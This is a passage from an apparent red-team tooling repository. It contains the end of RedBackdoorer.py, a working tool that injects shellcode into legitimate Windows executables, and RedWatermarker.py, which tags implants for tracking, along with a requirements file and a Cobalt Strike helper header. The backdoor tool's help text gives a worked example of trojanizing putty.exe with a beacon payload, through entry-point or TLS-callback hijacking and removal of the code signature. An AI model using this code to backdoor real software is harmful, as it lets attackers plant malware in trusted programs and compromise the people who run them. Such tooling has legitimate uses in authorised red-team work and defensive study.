    # Based on magnificent work by Joxean Koret:
    #   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
    #

    def removePESection(self, filename, sectName):
        pe = None
        try:
            pe = pefile.PE(filename)
            sections = SectionDoubleP(pe)

            if pe.sections[-1].Name.decode().startswith(sectName):
                self.logger.info('File already contained injected PE section. Overriding it...')
                sections.pop_back()
                pe.write(filename)

            return True

        except Exception as e:
            self.logger.err(f'Could not remove PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

    def addNewPESection(self, filename, sectName, sectionData, characteristics = 0x60000020):
        self.logger.info('Adjusting resulted PE file headers to insert additional PE section')

        self.removePESection(filename, sectName)

        pe = None
        try:
            # 0x60000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
            # 0xC0000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
            # 0x40000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
            # 0xE0000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE

            pe = pefile.PE(filename)
            name = sectName.encode() + ((8 - len(sectName)) * b'\x00')

            sections = SectionDoubleP(pe)

            pe = sections.push_back(
                Name = name,
                Characteristics = characteristics,
                Data = sectionData
            )

            pe.write(filename)

            self.logger.ok(f'New section named "{sectName}" added.')
            return True

        except SectionDoublePError as e:
            self.logger.err('Exception occured while injecting a new PE section: ' + str(e))
            sys.exit(1)
            return False

        except Exception as e:
            self.logger.err(f'Could not append PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

def opts(argv):
    global options

    epilog = '''
------------------

PE Backdooring <mode> consists of two comma-separated options.
First one denotes where to store shellcode, second how to run it:

<mode>

    save,run
      |   |
      |   +---------- 1 - change AddressOfEntryPoint
      |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
      |               3 - setup TLS callback
      |               4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook)
      |
      +-------------- 1 - store shellcode in the middle of a code section
                      2 - append shellcode to the PE file in a new PE section
Example:

    py RedBackdoorer.py 1,2 beacon.bin putty.exe putty-infected.exe

------------------
'''

    o = argparse.ArgumentParser(
        usage = 'RedBackdoorer.py [options] <mode> <shellcode> <infile>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent(epilog)
    )

    req = o.add_argument_group('Required arguments')
    req.add_argument('mode', help = 'PE Injection mode, see help epilog for more details.')
    req.add_argument('shellcode', help = 'Input shellcode file')
    req.add_argument('infile', help = 'PE file to backdoor')

    opt = o.add_argument_group('Optional arguments')
    opt.add_argument('-o', '--outfile', metavar='PATH', default='', help = 'Path where to save backdoored output file. If not given, will modify infile.')
    opt.add_argument('-v', '--verbose', action='store_true', help = 'Verbose mode.')

    bak = o.add_argument_group('Backdooring options')
    bak.add_argument('-n', '--section-name', metavar='NAME', default=DefaultSectionName,
        help = 'If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: ' + DefaultSectionName)
    bak.add_argument('-i', '--ioc', metavar='IOC', default='', help = 'Append IOC watermark to injected shellcode to facilitate implant tracking.')
    bak.add_argument('-e', '--export', metavar='NAME', default='', help = 'When backdooring DLLs, this specifies name of the exported function to hijack.')

    sign = o.add_argument_group('Authenticode signature options')
    sign.add_argument('-r', '--remove-signature', action='store_true', help = 'Remove PE Authenticode digital signature since its going to be invalidated anyway.')

    args = o.parse_args()
    options.update(vars(args))

    if ',' not in args.mode:
        Logger.fatal(f'<mode> must consist of two comma-separated parts: save,run . See help message epilog for more details.')

    if len(args.section_name) > 7:
        Logger.fatal('--section-name must not be longer than 7 characters!')

    return args

def main(argv):

    try:
        print('''

     ██▀███ ▓█████▓█████▄
    ▓██ ▒ ██▓█   ▀▒██▀ ██▌
    ▓██ ░▄█ ▒███  ░██   █▌
    ▒██▀▀█▄ ▒▓█  ▄░▓█▄   ▌
    ░██▓ ▒██░▒████░▒████▓
    ░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒
      ░▒ ░ ▒░░ ░  ░░ ▒  ▒
      ░░   ░   ░   ░ ░  ░
     ▄▄▄▄   ▄▄▄░  ░  ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███ ▓█████ ██▀███
    ▓█████▄▒████▄  ░▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▓█   ▀▓██ ▒ ██▒
    ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒███  ▓██ ░▄█ ▒
    ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄ ▒▓█  ▄▒██▀▀█▄
    ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██░▒████░██▓ ▒██▒
    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░░ ▒░ ░ ▒▓ ░▒▓░
    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░░ ░  ░ ░▒ ░ ▒░
     ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░   ░    ░░   ░
     ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░       ░  ░  ░
          ░         ░              ░

''')
    except:
        print('''

    :: RedBackdoorer
''')

    print(r'''    Your finest PE backdooring companion.
    Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
    <mb@binary-offensive.com>
    ''')


    args = opts(argv)
    if not args:
        return False

    outfile = ''
    temp = None

    if len(args.outfile) > 0:
        outfile = args.outfile

    else:
        temp = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy(args.infile, temp.name)
        outfile = temp.name
        Logger.dbg(f'Outfile is a temporary file: {outfile}')

    saveModeS, runModeS = args.mode.split(',')

    saveMode = 0
    runMode = 0

    try:
        saveMode = int(saveModeS)
        runMode = int(runModeS)
    except:
        Logger.fatal(f'<mode> must consist of two comma-separated parts: save,run . See help message epilog for more details.')

    peinj = PeBackdoor(options, Logger)
    result = peinj.backdoor(saveMode, runMode, args.shellcode, args.infile, outfile)

    if result :
        if len(args.outfile) > 0:
            Logger.ok(f'Backdoored PE file saved to: {args.outfile}')
        else:
            shutil.copy(outfile, args.infile)
            Logger.ok(f'Backdoored PE file in place.')
    else:
        Logger.fatal('Could not backdoor input PE file!')

    if temp:
        Logger.dbg('Removing temporary file...')
        temp.close()
        os.unlink(temp.name)

if __name__ == '__main__':
    main(sys.argv)



================================================
FILE: RedWatermarker.py
================================================
#!/usr/bin/python3
#
# Author:
#     Mariusz Banach / mgeeky '22, (@mariuszbit)
#     <mb@binary-offensive.com>
#
# Requirements:
#   - pefile
#   - yara-python
#

import os, re, sys
import string
import shutil
import tempfile
import argparse

import pefile
import yara

options = {
    'debug' : False,
    'verbose' : False,
    'check' : False,
    'dos_stub' : '',
    'checksum' : 0,
    'overlay' : '',
    'section' : '',
}

class Logger:
    def fatal(txt):
        print('[!] ' + txt)
        sys.exit(1)

    def info(txt):
        print('[.] ' + txt)

    def err(txt):
        print('[-] ' + txt)

    def ok(txt):
        print('[+] ' + txt)

    def warn(txt):
        print('[?] ' + txt)

    def verbose(txt):
        if options['verbose']:
            print('[>] ' + txt)

    def dbg(txt):
        if options['debug']:
            print('[dbg] ' + txt)

#
# Source:
#   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
#

class SectionDoublePError(Exception):
    pass

class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                                self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = b'\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders:])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)

        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, b'\x00' * FileAlignment)

        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in range(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)

            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)

        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + 0x3C)

        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)

        section_raw_address_offset = section_table_offset + 0x14

        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData+FileAlignment)

            section_raw_address_offset += 0x28

        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != b'\x00':
                return False
        return True

    def pop_back(self):
        """ Removes the last section of the section table.
            Deletes the section header in the section table, the data of the section in the file,
            pops the last section in the sections list of pefile and adjusts the sizes in the
            optional header.
        """

        # Checking if there are any sections to pop.
        if (    self.pe.FILE_HEADER.NumberOfSections > 0
            and self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections)):

            # Stripping the data of the section from the file.
            if self.pe.sections[-1].SizeOfRawData != 0:
                self.pe.__data__ = (self.pe.__data__[:self.pe.sections[-1].PointerToRawData] + \
                                    self.pe.__data__[self.pe.sections[-1].PointerToRawData + \
                                                        self.pe.sections[-1].SizeOfRawData:])

            # Overwriting the section header in the binary with nulls.
            # Getting the address of the section table and manually overwriting
            # the header with nulls unfortunally didn't work out.
            self.pe.sections[-1].Name = b'\x00'*8
            self.pe.sections[-1].Misc_VirtualSize = 0x00000000
            self.pe.sections[-1].VirtualAddress = 0x00000000
            self.pe.sections[-1].SizeOfRawData = 0x00000000
            self.pe.sections[-1].PointerToRawData = 0x00000000
            self.pe.sections[-1].PointerToRelocations = 0x00000000
            self.pe.sections[-1].PointerToLinenumbers = 0x00000000
            self.pe.sections[-1].NumberOfRelocations = 0x0000
            self.pe.sections[-1].NumberOfLinenumbers = 0x0000
            self.pe.sections[-1].Characteristics = 0x00000000

            self.pe.sections.pop()
            self.pe.FILE_HEADER.NumberOfSections -=1

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)
            self.pe.parse_sections(section_table_offset)

            assert len(self.pe.sections) == self.pe.FILE_HEADER.NumberOfSections

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("There's no section to pop.")

    def push_back(self, Name=b".NewSec", VirtualSize=0x00000000, VirtualAddress=0x00000000,
                RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                Characteristics=0xE00000E0, Data=b""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.

            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.

            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):

            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment

            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                        self.pe.sections[-1].VirtualAddress)
                or  VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                        (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize < len(Data):
                VirtualSize = len(Data)

            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += b'\x00' * (FileAlignment - (len(Data) % FileAlignment))

            if RawSize != len(Data):
                if (    RawSize > len(Data)
                    and (RawSize % FileAlignment) == 0):
                    Data += b'\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                        section_table_offset + (self.pe.FILE_HEADER.NumberOfSections+1)*0x28
                or not self.__is_null_data(self.pe.get_data(section_table_offset +
                        (self.pe.FILE_HEADER.NumberOfSections)*0x28, 0x28))):

                Logger.dbg(f'Checking if more space can be added to PE headers: {self.pe.OPTIONAL_HEADER.SizeOfHeaders} < {self.pe.sections[0].VirtualAddress}?')

                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:

                    self.__add_header_space()
                    Logger.dbg("Additional space to add a new section header was allocated.")
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                                    self.pe.sections[-1].SizeOfRawData)):
                    RawAddress =     \
                        (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
                                    self.pe.__data__[RawAddress:])

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset+0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset+0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset+0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset+0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset+0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset+0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset+0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset+0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset+0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections +=1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " +
                "size of the sections list of pefile don't match ({} != {})".format(
                self.pe.FILE_HEADER.NumberOfSections, len(self.pe.sections)
                ))

        return self.pe

def hexdump(data, addr = 0, num = 0):
    s = ''
    n = 0
    lines = []
    if num == 0: num = len(data)

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (addr + i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % (data[j] & 0xff)

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)

class PeWatermarker:
    SupportedVersionFields = {
        'CompanyName',
        'FileDescription',
        'FileVersion',
        'InternalName',
        'OriginalFileName',
        'ProductName',
        'ProductVersion',
    }

    def __init__(self, options, logger, infile, outfile):
        self.options = options
        self.pe = None
        self.logger = logger
        self.infile = infile
        self.outfile = outfile

    def openFile(self):
        self.pe = pefile.PE(self.infile, fast_load=False)

    def watermark(self):
        try:
            modified = False
            self.openFile()

            #
            # do not change order of below methods
            #

            modified |= self.checksum()
            modified |= self.dosStub()
            modified |= self.section(modified)

            # overlay needs to be the last one
            modified |= self.overlay(modified)

            if modified:
                Logger.dbg('Saving modified PE file...')
                self.pe.write(self.outfile)

            elif not self.options['check']:
                Logger.dbg('File was not modified in any way.')

            return True

        except pefile.PEFormatError:
            Logger.warn('Input file is not a valid PE file.')
            return False

        except Exception as e:
            raise

        finally:
            if self.pe:
                self.pe.close()

    def checkIt(self, where, rule_name, watermark):
        if type(watermark) == bytes:
            watermark = watermark.decode()

        ruleContent = f'''
            rule {rule_name}
            {{
                strings:
                    $str1 = "{watermark}"

                condition:
                    $str1
            }}
        '''

        Logger.dbg(f'Matching against YARA rule:\n{ruleContent}\n')

        rule = yara.compile(source = ruleContent)
        matches = rule.match(data = self.pe.__data__)

        if len(matches) > 0:
            Logger.ok(f'File contains watermark in {where}.')
            return True

        else:
            Logger.err(f'File did not contain watermark in {where}.')
            return False

    def section(self, modified):
        if len(self.options['section']) > 0:
            name, marker = self.options['section'].split(',')

            if self.options['check']:
                self.checkIt('PE section', 'watermark_in_pe_section', marker)
                return False

            Logger.dbg('Appending new PE section.')

            if modified:
                self.pe.write(self.outfile)
            self.pe.close()

            out = self.addNewPESection(self.outfile, name, marker.encode())

            with open(self.outfile, 'rb') as f:
                self.pe = pefile.PE(data = f.read(), fast_load = False)

            return out

        return False

    def dosStub(self):
        if len(self.options['dos_stub']) > 0:
            dosMarker = self.options['dos_stub'].encode()

            if self.options['check']:
                self.checkIt('DOS Stub', 'watermark_in_dos_stub', dosMarker)
                return False

            elfanew = self.pe.DOS_HEADER.e_lfanew
            a = self.pe.DOS_HEADER.sizeof()
            b = elfanew

            currentDosStub = self.pe.__data__[a:b]

            if len(dosMarker) >= len(currentDosStub):
                Logger.err(f'Provided --dos-stub is too long. Must not be longer than {len(currentDosStub)} characters!')
                return False

            if currentDosStub.startswith(dosMarker):
                Logger.info('Watermark already injected to DOS Stub. Skipping it...')
                return False

            currentDosStub = dosMarker + currentDosStub[len(dosMarker):]

            self.pe.set_bytes_at_offset(a, dosMarker)

            Logger.ok('Injected watermark to PE DOS stub.')

            return True

        return False

    def checksum(self):
        if self.options['checksum'] != 0:
            if self.options['check']:
                if self.pe.OPTIONAL_HEADER.CheckSum == self.options['checksum']:
                    Logger.ok('File contained watermark in Checksum field.')
                else:
                    Logger.err('File did not contain watermark in Checksum field.')

                return False

            Logger.ok(f'Setting PE checksum to {self.options["checksum"]} (0x{self.options["checksum"]:x})')
            self.pe.OPTIONAL_HEADER.CheckSum = int((self.options['checksum']) & 0xffffffff)

            return True

        return False

    def overlay(self, modified):
        if self.options['overlay']:
            watermark = self.options['overlay'].encode()

            overlay = self.pe.get_overlay()

            if self.options['check']:
                self.checkIt('Overlay', 'watermark_in_overlay', watermark)
                return False

            if overlay is not None and watermark in overlay:
                Logger.err('Watermark already present in PE file overlay. Skipping overlay watermarking...')
                return False

            else:
                Logger.ok('Appended watermark to PE overlay.')

                if modified:
                    self.pe.write(self.outfile)
                self.pe.close()

                with open(self.outfile, 'ab') as f:
                    f.write(watermark)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)

                return True

        return False

    #
    # Based on magnificent work by Joxean Koret:
    #   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
    #

    def removePESection(self, filename, sectName):
        pe = None
        try:
            pe = pefile.PE(filename)
            sections = SectionDoubleP(pe)

            if pe.sections[-1].Name.decode().startswith(sectName):
                Logger.info('File already contained injected PE section. Overriding it...')
                sections.pop_back()
                pe.write(filename)

            return True

        except Exception as e:
            Logger.err(f'Could not remove PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

    def addNewPESection(self, filename, sectName, sectionData):
        Logger.info('Adjusting resulted PE file headers to insert additional PE section')

        self.removePESection(filename, sectName)

        pe = None
        try:
            # 0x60000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
            # 0xC0000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
            # 0x40000040: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
            # 0xE0000020: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE

            pe = pefile.PE(filename)
            name = sectName.encode() + ((8 - len(sectName)) * b'\x00')

            sections = SectionDoubleP(pe)

            pe = sections.push_back(
                Name = name,
                Characteristics = 0x40000040,
                Data = sectionData
            )

            pe.write(filename)

            Logger.ok(f'New section named "{sectName}" added.')
            return True

        except SectionDoublePError as e:
            Logger.err('Exception occured while injecting a new PE section: ' + str(e))
            return False

        except Exception as e:
            Logger.err(f'Could not append PE section! Error: {e}')
            return False

        finally:
            if pe:
                pe.close()

def opts(argv):
    global options

    o = argparse.ArgumentParser(
        usage = 'RedWatermarker.py [options] <infile>'
    )

    req = o.add_argument_group('Required arguments')
    req.add_argument('infile', help = 'Input implant file')

    opt = o.add_argument_group('Optional arguments')
    opt.add_argument('-C', '--check', action='store_true', help = 'Do not actually inject watermark. Check input file if it contains specified watermarks.')
    opt.add_argument('-v', '--verbose', action='store_true', help = 'Verbose mode.')
    opt.add_argument('-d', '--debug', action='store_true', help = 'Debug mode.')
    opt.add_argument('-o', '--outfile', metavar='PATH', default='', help = 'Path where to save output file with watermark injected. If not given, will modify infile.')

    exe = o.add_argument_group('PE Executables Watermarking')
    exe.add_argument('-t', '--dos-stub', default='', metavar='STR', help = 'Insert watermark into PE DOS Stub (This program cannot be run...).')
    exe.add_argument('-c', '--checksum', default=0, metavar='NUM', help = 'Preset PE checksum with this value (4 bytes). Must be number. Can start with 0x for hex value.')
    exe.add_argument('-e', '--overlay',  default='', metavar='STR', help = 'Append watermark to the file\'s Overlay (at the end of the file).')
    exe.add_argument('-s', '--section',  default='', metavar='NAME,STR', help = 'Append a new PE section named NAME and insert watermark there. Section name must be shorter than 8 characters. Section will be marked Read-Only, non-executable.')

    args = o.parse_args()
    options.update(vars(args))

    if args.checksum != 0:
        try:
            base = 10
            args.checksum = args.checksum.lower()

            if args.checksum.startswith('0x') or \
                'a' in args.checksum or 'b' in args.checksum or 'c' in args.checksum or \
                'd' in args.checksum or 'e' in args.checksum or 'f' in args.checksum:
                base = 16

            num = int(args.checksum, base)

            if num >= 2**32:
                Logger.fatal('Specified checksum number is too large! Must be no bigger than 2^32-1 (0xffffffff)!')

            options['checksum'] = num

        except Exception as e:
            Logger.fatal('Invalid --checksum value, could not be casted to integer!')

    if len(args.section) > 0:
        if ',' not in args.section:
            Logger.fatal('Invalid --section value, needs to be NAME,STR where NAME is a section name. Example: .foobar,injected-marker')

        name, marker = args.section.split(',')
        if len(name) > 7:
            Logger.fatal('Section name must not be long than 7 characters!')

    return args

def main(argv):

    try:
        print('''
                      ;
                      ED.
                     ,E#Wi
  j.               f#iE###G.
  EW,            .E#t E#fD#W;
  E##j          i#W,  E#t t##L
  E###D.       L#D.   E#t  .E#K,
  E#jG#W;    :K#Wfff; E#t    j##f
  E#t t##f   i##WLLLLtE#t    :E#K:
  E#t  :K#E:  .E#L    E#t   t##L
  E#KDDDD###i   f#E:  E#t .D#W;                  ,;                                                      G:              ,;
  E#f,t#Wi,,,    ,WW; E#tiW#G.                 f#i j.                                          j.        E#,    :      f#i j.
  E#t  ;#W: ;     .D#;E#K##i .. GEEEEEEEL    .E#t  EW,                 ..       :           .. EW,       E#t  .GE    .E#t  EW,
  DWi   ,K.DL       ttE##D. ;W, ,;;L#K;;.   i#W,   E##j               ,W,     .Et          ;W, E##j      E#t j#K;   i#W,   E##j
  f.     :K#L     LWL E#t  j##,    t#E     L#D.    E###D.            t##,    ,W#t         j##, E###D.    E#GK#f    L#D.    E###D.
  EW:   ;W##L   .E#f  L:  G###,    t#E   :K#Wfff;  E#jG#W;          L###,   j###t        G###, E#jG#W;   E##D.   :K#Wfff;  E#jG#W;
  E#t  t#KE#L  ,W#;     :E####,    t#E   i##WLLLLt E#t t##f       .E#j##,  G#fE#t      :E####, E#t t##f  E##Wi   i##WLLLLt E#t t##f
  E#t f#D.L#L t#K:     ;W#DG##,    t#E    .E#L     E#t  :K#E:    ;WW; ##,:K#i E#t     ;W#DG##, E#t  :K#E:E#jL#D:  .E#L     E#t  :K#E:
  E#jG#f  L#LL#G      j###DW##,    t#E      f#E:   E#KDDDD###i  j#E.  ##f#W,  E#t    j###DW##, E#KDDDD###E#t ,K#j   f#E:   E#KDDDD###i
  E###;   L###j      G##i,,G##,    t#E       ,WW;  E#f,t#Wi,,,.D#L    ###K:   E#t   G##i,,G##, E#f,t#Wi,,E#t   jD    ,WW;  E#f,t#Wi,,,
  E#K:    L#W;     :K#K:   L##,    t#E        .D#; E#t  ;#W: :K#t     ##D.    E#t :K#K:   L##, E#t  ;#W: j#t          .D#; E#t  ;#W:
  EG      LE.     ;##D.    L##,     fE          tt DWi   ,KK:...      #G      .. ;##D.    L##, DWi   ,KK: ,;            tt DWi   ,KK:
  ;       ;@      ,,,      .,,       :                                j          ,,,      .,,

''')
    except:
        print('''

    :: RedWatermarker
''')

    print(r'''    Watermark thy implants, track them in VirusTotal
    Mariusz Banach / mgeeky '22, (@mariuszbit)
    <mb@binary-offensive.com>
''')

    args = opts(argv)
    if not args:
        return False

    outfile = ''
    temp = None

    if not options['check']:
        if len(args.outfile) > 0:
            outfile = args.outfile

        else:
            temp = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy(args.infile, temp.name)
            outfile = temp.name
            Logger.dbg(f'Outfile is a temporary file: {outfile}')

    pewat = PeWatermarker(options, Logger, args.infile, outfile)
    result = pewat.watermark()

    if result and not options['check']:
        if len(args.outfile) > 0:
            Logger.ok(f'Watermarked file saved to: {args.outfile}')
        else:
            shutil.copy(outfile, args.infile)
            Logger.ok(f'Watermarked file in place.')

    if temp and not options['check']:
        Logger.dbg('Removing temporary file...')
        temp.close()
        os.unlink(temp.name)

if __name__ == '__main__':
    main(sys.argv)



================================================
FILE: requirements.txt
================================================
pyyaml
pefile
capstone
pythonnet==3.0.0a2
pe_tools
capstone
keystone-engine
pycryptodome
argparse
PrettyTable
PySimpleGUI
clipboard
colorama
yara-python
donut-shellcode



================================================
FILE: CobaltStrike/cobaltProtectMyTooling.py
================================================
#!/usr/bin/python3
#
# Helper script spawning python and ProtectMyTooling.py according to settings
# received from CobaltStrike. Used by Cobalt's ProtectMyTooling.cna aggressor script.
# Do not use directly.
#
# Author:
#   Mariusz Banach / mgeeky, '20
